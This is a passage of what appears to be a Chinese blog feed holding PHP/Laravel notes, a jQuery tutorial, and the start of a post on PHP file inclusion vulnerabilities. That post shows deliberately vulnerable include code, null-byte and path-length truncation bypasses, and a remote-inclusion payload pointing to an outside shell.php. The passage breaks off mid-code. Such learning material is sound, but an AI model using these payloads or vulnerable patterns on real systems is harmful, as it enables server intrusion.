class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="comment">//定义一个类</span></span></span><br><span class="line"><span class="php">    <span class="class"><span class="keyword">class</span> <span class="title">Mysqldb</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $host;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $user;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $pwd;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $dbname;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $charset;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> $con;</span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span>  <span class="title">__construct</span><span class="params">($config)</span></span>&#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;host = <span class="keyword">isset</span>($config[<span class="string">'host'</span>])?$config[<span class="string">'host'</span>]:<span class="string">'localhost'</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;user = <span class="keyword">isset</span>($config[<span class="string">'user'</span>])?$config[<span class="string">'user'</span>]:<span class="string">'root'</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;pwd = <span class="keyword">isset</span>($config[<span class="string">'pwd'</span>])?$config[<span class="string">'pwd'</span>]:<span class="string">'root'</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;dbname = <span class="keyword">isset</span>($config[<span class="string">'dbname'</span>])?$config[<span class="string">'dbname'</span>]:<span class="string">'xss'</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;charset = <span class="keyword">isset</span>($config[<span class="string">'charset'</span>])?$config[<span class="string">'charset'</span>]:<span class="string">'utf8'</span>;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;connect();</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;selectDb();</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;setchart();</span></span><br><span class="line"><span class="php">            </span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="comment">//封装对象</span></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            $con = mysqli_connect(<span class="keyword">$this</span>-&gt;host,<span class="keyword">$this</span>-&gt;user,<span class="keyword">$this</span>-&gt;pwd);</span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(!$con)&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">die</span>(<span class="string">'链接失败'</span>);</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">$this</span>-&gt;con = $con;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        </span></span><br><span class="line"><span class="php">        <span class="comment">//封装选择数据库</span></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">selectDb</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            mysqli_select_db(<span class="keyword">$this</span>-&gt;con,<span class="keyword">$this</span>-&gt;dbname);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="comment">//封装设置字符集</span></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">setchart</span><span class="params">()</span></span>&#123;</span></span><br><span class="line"><span class="php">            mysqli_set_charset(<span class="keyword">$this</span>-&gt;con,<span class="keyword">$this</span>-&gt;charset);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="comment">//封装获取资源</span></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">query</span><span class="params">($sql)</span></span>&#123;</span></span><br><span class="line"><span class="php">            $res=mysqli_query(<span class="keyword">$this</span>-&gt;con,$sql);<span class="comment">//返回的资源</span></span></span><br><span class="line"><span class="php">            <span class="keyword">if</span>(!$res)&#123;</span></span><br><span class="line"><span class="php">                <span class="keyword">return</span> <span class="keyword">false</span>;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> $res;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="comment">//查询全部数据</span></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">selectall</span><span class="params">($sql)</span></span>&#123;</span></span><br><span class="line"><span class="php">            $res = <span class="keyword">$this</span>-&gt;query($sql);</span></span><br><span class="line"><span class="php">            $arr = [];</span></span><br><span class="line"><span class="php">            <span class="keyword">while</span> ($row = mysqli_fetch_assoc($res))&#123;</span></span><br><span class="line"><span class="php">                $arr[] = $row;</span></span><br><span class="line"><span class="php">            &#125;</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> $arr;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="comment">//查询单条语句</span></span></span><br><span class="line"><span class="php">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">selectone</span><span class="params">($sql)</span></span>&#123;</span></span><br><span class="line"><span class="php">            $res = <span class="keyword">$this</span>-&gt;query($sql);</span></span><br><span class="line"><span class="php">            </span></span><br><span class="line"><span class="php">            $row = mysqli_fetch_assoc($res);</span></span><br><span class="line"><span class="php">            <span class="keyword">return</span> $row;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>包含上面文件以后 即可调用mysqldb类</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span><span class="params">($class_anme)</span></span>&#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">require</span> <span class="string">'./'</span>.$class_anme.<span class="string">'.class.php'</span>;        </span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">    $arr1 = <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">        <span class="string">'host'</span>=&gt;<span class="string">'localhost'</span></span></span><br><span class="line"><span class="php">    );<span class="comment">//传入数组 </span></span></span><br><span class="line"><span class="php">    $db1 = <span class="keyword">new</span> Mysqldb($arr1); <span class="comment">//将数组传入类里</span></span></span><br><span class="line"><span class="php">    $sql = <span class="string">'select * from admin where id=1'</span>; <span class="comment">//构造sql语句</span></span></span><br><span class="line"><span class="php">    $res = $db1-&gt;selectone($sql);<span class="comment">//sql语句带入到 selectone方法进行单条查询</span></span></span><br><span class="line"><span class="php">    print_r($res);</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="laravel"><a href="#laravel" class="headerlink" title="laravel"></a>laravel</h2><p>运行laravel项目</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php artisan serve</span></span><br></pre></td></tr></table></figure><p>创建laravel项目</p><figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">composer </span><span class="built_in">create-project</span> <span class="built_in">--prefer-dist</span> <span class="string">laravel/</span><span class="string">laravel=</span>版本号 项目名称</span><br></pre></td></tr></table></figure><p>创建控制器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">php</span> <span class="selector-tag">artisan</span> <span class="selector-tag">make</span><span class="selector-pseudo">:controller</span> 控制器名</span><br></pre></td></tr></table></figure><p>创建验证器</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">php</span> <span class="selector-tag">artisan</span> <span class="selector-tag">make</span><span class="selector-pseudo">:request</span> 验证器的名称</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/12/17/y5GjWgmYPFn1vbe.png" alt="图片1.png"></p><p>创建模型</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">php</span> <span class="selector-tag">artisan</span> <span class="selector-tag">make</span><span class="selector-pseudo">:model</span> 模型名</span><br></pre></td></tr></table></figure><p>创建中间件</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">php</span> <span class="selector-tag">artisan</span> <span class="selector-tag">make</span><span class="selector-pseudo">:middleware</span> 中间件名称</span><br></pre></td></tr></table></figure><p>自己定义验证规则</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用validate关键字</span><br><span class="line">required 必填 不能为空</span><br><span class="line">present 必填 可以为空</span><br><span class="line"><span class="built_in">filled </span>可不填 填时不能为空</span><br><span class="line">nullable 验证字段值可以为null</span><br></pre></td></tr></table></figure>]]></content>
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> css </tag>
            
            <tag> html </tag>
            
            <tag> js </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>jQuery学习笔记</title>
      <link href="/2019/11/10/jQuery%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2019/11/10/jQuery%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      <content type="html"><![CDATA[<p>最近在学习jQuery 不难 只是有些东西容易忘 特此记录之</p><h2 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h2><h3 id="按ID查找"><a href="#按ID查找" class="headerlink" title="按ID查找"></a>按ID查找</h3><figure class="highlight cal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// 查找&lt;<span class="keyword">div</span> id=<span class="string">"abc"</span>&gt;:</span><br><span class="line"><span class="keyword">var</span> <span class="keyword">div</span> = $(<span class="string">'#abc'</span>);</span><br></pre></td></tr></table></figure><h3 id="按标签查找"><a href="#按标签查找" class="headerlink" title="按标签查找"></a>按标签查找</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> ps = $(<span class="string">'p'</span>); <span class="comment">// 返回所有&lt;p&gt;节点</span></span><br><span class="line">ps.length; <span class="comment">// 数一数页面有多少个&lt;p&gt;节点</span></span><br></pre></td></tr></table></figure><p>按class查找</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var a = $(<span class="string">'.red'</span>); <span class="regexp">//</span> 所有节点包含`<span class="javascript"><span class="class"><span class="keyword">class</span></span>=<span class="string">"red"</span></span>`都将返回</span><br></pre></td></tr></table></figure><h3 id="层级选择器"><a href="#层级选择器" class="headerlink" title="层级选择器"></a>层级选择器</h3><p>如果DOM元素有层级关系 层级之间用空格隔开</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span></span>=<span class="string">"testing"</span>&gt;</span><br><span class="line">        &lt;ul <span class="class"><span class="keyword">class</span></span>=<span class="string">"lang"</span>&gt;</span><br><span class="line">            &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"lang-javascript"</span>&gt;JavaScript&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">            &lt;li class="lang-python"&gt;Python&lt;/</span>li&gt;</span><br><span class="line">            &lt;li <span class="class"><span class="keyword">class</span></span>=<span class="string">"lang-lua"</span>&gt;Lua&lt;<span class="regexp">/li&gt;</span></span><br><span class="line"><span class="regexp">        &lt;/u</span>l&gt;</span><br><span class="line">    &lt;<span class="regexp">/div&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">(<span class="string">'.lang .lang-javascript'</span>).css(<span class="string">"color"</span>,<span class="string">"red"</span>)</span></span><br></pre></td></tr></table></figure><h3 id="jQuery-特殊选择器"><a href="#jQuery-特殊选择器" class="headerlink" title="jQuery 特殊选择器"></a>jQuery 特殊选择器</h3><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">:<span class="built_in">input</span>：可以选择<span class="symbol">&lt;input&gt;</span>，<span class="symbol">&lt;textarea&gt;</span>，<span class="symbol">&lt;select&gt;</span>和<span class="symbol">&lt;button&gt;</span>；</span><br><span class="line">:<span class="keyword">file</span>：可以选择&lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"file"</span>&gt;，和<span class="built_in">input</span>[<span class="built_in">type</span>=<span class="keyword">file</span>]一样；</span><br><span class="line">:checkbox：可以选择复选框，和<span class="built_in">input</span>[<span class="built_in">type</span>=checkbox]一样；</span><br><span class="line">:radio：可以选择单选框，和<span class="built_in">input</span>[<span class="built_in">type</span>=radio]一样；</span><br><span class="line">:focus：可以选择当前输入焦点的元素，例如把光标放到一个<span class="symbol">&lt;input&gt;</span>上，用$(<span class="string">'input:focus'</span>)就可以选出；</span><br><span class="line">:checked：选择当前勾上的单选框和复选框，用这个选择器可以立刻获得用户选择的项目，如$(<span class="string">'input[type=radio]:checked'</span>)；</span><br><span class="line">:enabled：可以选择可以正常输入的<span class="symbol">&lt;input&gt;</span>、<span class="symbol">&lt;select&gt;</span> 等，也就是没有灰掉的输入；</span><br><span class="line">:disabled：和:enabled正好相反，选择那些不能输入的。</span><br></pre></td></tr></table></figure><h2 id="操作DOM"><a href="#操作DOM" class="headerlink" title="操作DOM"></a>操作DOM</h2><h3 id="修改Text和HTML"><a href="#修改Text和HTML" class="headerlink" title="修改Text和HTML"></a>修改Text和HTML</h3><p>jQuery对象的<code>text()</code>和<code>html()</code>方法分别获取节点的文本和原始HTML文本</p><p><img src="https://i.loli.net/2019/11/10/zIaVANCuF1xUJbH.png" alt="QQ截图20191110192329.png"></p><p>无参数调用<code>text()</code>是获取文本，传入参数就变成设置文本，HTML也是类似操作</p><p><img src="https://i.loli.net/2019/11/10/JD4Gh8mRN9UYlfM.png" alt="QQ截图20191110192522.png"></p><h3 id="操作表单"><a href="#操作表单" class="headerlink" title="操作表单"></a>操作表单</h3><p>jQuery对象统一提供<code>val()</code>方法获取和设置对应的<code>value</code>属性、</p><p>和js中的 <code>.value()</code>作用一样</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">var</span> <span class="selector-tag">input</span> = $(<span class="string">'#test-input'</span>)</span><br><span class="line"><span class="selector-tag">input</span>.val(<span class="string">'鸡你太美'</span>)</span><br><span class="line">console.log(<span class="selector-tag">input</span>.val())</span><br></pre></td></tr></table></figure><p>不带参数是获取，带上参数是赋值</p><h3 id="修改CSS"><a href="#修改CSS" class="headerlink" title="修改CSS"></a>修改CSS</h3><p>jQuery对象有“批量操作”的特点 用于修改css比较方便 如果是js还需要遍历的</p><p><img src="https://i.loli.net/2019/11/10/yoNQFGpXHvI8mxA.png" alt="QQ截图20191110192842.png"></p><h3 id="添加class属性"><a href="#添加class属性" class="headerlink" title="添加class属性"></a>添加class属性</h3><p>在做过了几个案例中很多都需要添加class属性</p><p><code>addClass()</code>添加属性</p><p><img src="https://i.loli.net/2019/11/10/rHaS2YofWV9xJyP.png" alt="QQ截图20191110193823.png"></p><h3 id="显示和隐藏DOM"><a href="#显示和隐藏DOM" class="headerlink" title="显示和隐藏DOM"></a>显示和隐藏DOM</h3><p>jQuery<code>show()</code>和<code>hide()</code>方法</p><p><img src="https://i.loli.net/2019/11/10/yxA6EXCqJiBpV9G.png" alt="QQ截图20191110194116.png"></p><p>上图获取到<code>JavaScript</code>之后将其隐藏 显示同理</p><h3 id="获取DOM信息"><a href="#获取DOM信息" class="headerlink" title="获取DOM信息"></a>获取DOM信息</h3><p><code>jQuery</code>可以获取DOM的高宽等信息</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 浏览器可视窗口大小:</span></span><br><span class="line">$<span class="comment">(window)</span>.width<span class="comment">()</span>; <span class="comment">// 800</span></span><br><span class="line">$<span class="comment">(window)</span>.height<span class="comment">()</span>; <span class="comment">// 600</span></span><br><span class="line"><span class="comment">// HTML文档大小:</span></span><br><span class="line">$<span class="comment">(document)</span>.width<span class="comment">()</span>; <span class="comment">// 800</span></span><br><span class="line">$<span class="comment">(document)</span>.height<span class="comment">()</span>; <span class="comment">// 3500</span></span><br><span class="line"><span class="comment">// 某个div的大小:</span></span><br><span class="line">var div = $<span class="comment">('#test-div')</span>;</span><br><span class="line">div.width<span class="comment">()</span>; <span class="comment">// 600</span></span><br><span class="line">div.height<span class="comment">()</span>; <span class="comment">// 300</span></span><br><span class="line">div.width<span class="comment">(400)</span>; <span class="comment">// 设置CSS属性 width: 400px</span></span><br><span class="line">div.height<span class="comment">('200px')</span>; <span class="comment">// 设置CSS属性 height: 200px</span></span><br></pre></td></tr></table></figure><p><code></code>attr()<code>用于获取属性赋值属性</code>removeAttr()`用于删除属性</p><p><img src="https://i.loli.net/2019/11/10/1CEHNtgsUK23rqw.png" alt="QQ截图20191110194900.png"></p><p><code>prop()</code>方法的作用和<code>attr()</code>类似</p><p><code>attr()</code>更适合操作自定义属性。</p><p><code>prop()</code>更适合操作标签本身的属性</p><h3 id="修改DOM结构"><a href="#修改DOM结构" class="headerlink" title="修改DOM结构"></a>修改DOM结构</h3><p><code>append()</code>和<code>prepend()</code>添加DOM节点</p><p><img src="https://i.loli.net/2019/11/10/zOvldkIpHrnADtg.png" alt="QQ截图20191110195946.png"></p><p>两者区别就是<code>append()</code>把DOM添加到最后，<code>prepend()</code>则把DOM添加到最前。</p><p><code>remove()</code>删除DOM节点</p><h2 id="事件"><a href="#事件" class="headerlink" title="事件"></a>事件</h2><p>jQuery很多时候需要绑定事件来出发一些东西</p><p><code>on</code>方法用来绑定一个事件</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">onclick</span><span class="comment">//鼠标单机时触发</span></span><br><span class="line">onmousemove <span class="comment">//当鼠标指针移动到元素上时触发。</span></span><br><span class="line">onmouseout<span class="comment">//当鼠标指针移出元素时触发</span></span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a <span class="attribute">id</span>=<span class="string">"test-link"</span> <span class="attribute">href</span>=<span class="string">"#0"</span>&gt;点我试试&lt;/a&gt;</span><br></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> a = $(<span class="string">'#test-link'</span>);</span></span><br><span class="line"><span class="actionscript">    a.on(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span> <span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="actionscript">        alert(<span class="string">'Hello!'</span>);</span></span><br><span class="line"><span class="undefined">    &#125;);</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2019/11/10/CI2D6XH1PxiJaAs.png" alt="QQ截图20191110201359.png"></p><h2 id="案例"><a href="#案例" class="headerlink" title="案例"></a>案例</h2><h3 id="五星好评"><a href="#五星好评" class="headerlink" title="五星好评"></a>五星好评</h3><p><img src="https://i.loli.net/2019/11/11/3z7Go8iE4RI5ah1.png" alt="QQ截图20191111082131.png"></p><p><img src="https://i.loli.net/2019/11/11/lkpBLG2EoOmShqf.png" alt="QQ截图20191111082317.png"></p><p>核心代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> re = $(<span class="string">'li'</span>)</span><br><span class="line">re.on(<span class="string">'mousemove'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">re.css(<span class="string">'color'</span>,<span class="string">'red'</span>);<span class="comment">//移动到li全部字体变为红色</span></span><br><span class="line">$(<span class="keyword">this</span>).css(<span class="string">'color'</span>,<span class="string">'red'</span>);<span class="comment">//当前li变为红色</span></span><br><span class="line">    $(<span class="keyword">this</span>).nextAll().css(<span class="string">'color'</span>,<span class="string">'gainsboro'</span>);<span class="comment">//当前li之后的所有li变为灰色</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><code>nextAll()</code> 方法返回被选元素之后的所有同级元素。<code>nextAll()</code> 是实现本案例的核心</p>]]></content>
      
      <categories>
          
          <category> JS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jQuery </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>PHP安全</title>
      <link href="/2019/11/04/PHP%E5%AE%89%E5%85%A8/"/>
      <url>/2019/11/04/PHP%E5%AE%89%E5%85%A8/</url>
      <content type="html"><![CDATA[<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><p>常见的导致文件包含漏洞的函数如下</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">include</span><span class="params">()</span>,<span class="title">include_once</span><span class="params">()</span>,<span class="title">require</span><span class="params">()</span>,<span class="title">require_once</span><span class="params">()</span>,<span class="title">fopen</span><span class="params">()</span>,<span class="title">readfile</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>当使用</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">include</span><span class="params">()</span>,<span class="title">include_once</span><span class="params">()</span>,<span class="title">require</span><span class="params">()</span>,<span class="title">require_once</span><span class="params">()</span></span></span><br></pre></td></tr></table></figure><p>包含一个新文件时，该文件作为PHP代码去执行。也就是说如果被包含的是txt文件，图片文件，远程url也会被当做PHP代码去执行</p><p><img src="https://i.loli.net/2019/11/04/bNS5WOjwPmBUxuG.png" alt="QQ截图20191104111626.png"></p><p>想要利用成功文件包含漏洞应满足</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">include</span><span class="params">()</span></span>等函数通过动态变量的方式引入需要包含的文件</span><br><span class="line">用户能够控制该动态变量</span><br></pre></td></tr></table></figure><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file = $_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span class="php"><span class="keyword">if</span>(file_exists(<span class="string">'./home/bh/'</span>.$file.<span class="string">'.php'</span>))&#123;</span></span><br><span class="line"><span class="php"><span class="keyword">include</span> <span class="string">'./home/bh/'</span>.$file.<span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>有这一段代码 用户能够控制<code>file</code> 如果我传入</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">file</span> = ../<span class="keyword">info</span>.txt</span><br></pre></td></tr></table></figure><p>则这段代码就变成了</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"><span class="meta-keyword">include</span> './home/../info.txt.php';</span></span><br></pre></td></tr></table></figure><p>但是被包含的文件<code>info.txt.php</code>文件是不存在的</p><p>这时候我们可以利用已下几种方法去绕过</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">%<span class="number">00</span>截断</span><br><span class="line">../info.txt%<span class="number">00</span></span><br><span class="line">(需要 magic_quotes_gpc=<span class="literal">off</span>，PHP小于<span class="number">5.3</span><span class="number">.4</span>有效)</span><br><span class="line"></span><br><span class="line">径长度截断：</span><br><span class="line">..<span class="regexp">/info.txt/</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.[…]<span class="regexp">/./</span>.<span class="regexp">/./</span>.<span class="regexp">/./</span>.</span><br><span class="line">(php版本小于<span class="number">5.2</span><span class="number">.8</span>(?)可以成功，linux需要文件名长于<span class="number">4096</span>，windows需要长于<span class="number">256</span>)</span><br></pre></td></tr></table></figure><h3 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h3><p>如果PHP配置选项 <code>allow_url_include</code>为on则可以远程加载文件</p><p>实战中不常见(可能怪我太菜 我很少遇到)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="keyword">include</span> $_GET[<span class="string">'url'</span>];</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http<span class="variable">s:</span>//poc10.<span class="keyword">cn</span>/<span class="keyword">shell</span>.php</span><br></pre></td></tr></table></figure><p>shell.txt内容为<code>&lt;?php phpinfo(); ?&gt;</code>会直接打印出phpinfo</p><p>远程文件包含还有一种PHP输入输出流的利用方式，可直接执行POST代码</p><p>(php配置文件中需同时开启 allow_url_fopen 和 allow_url_include（PHP &lt; 5.30）)</p><p><img src="https://i.loli.net/2019/11/04/KuI4lGLkboZt1Xc.png" alt="QQ截图20191104150048.png"></p><p>在ctf中比较常见</p><h3 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h3><p>文件包含漏洞也能读取敏感文件或服务器端脚本的源代码</p><p>使用<code>../../</code>的方式返回上层目录这种方式被称为目录遍历</p><p>例如有如下代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$file = $_GET[<span class="string">'file'</span>];</span></span><br><span class="line"><span 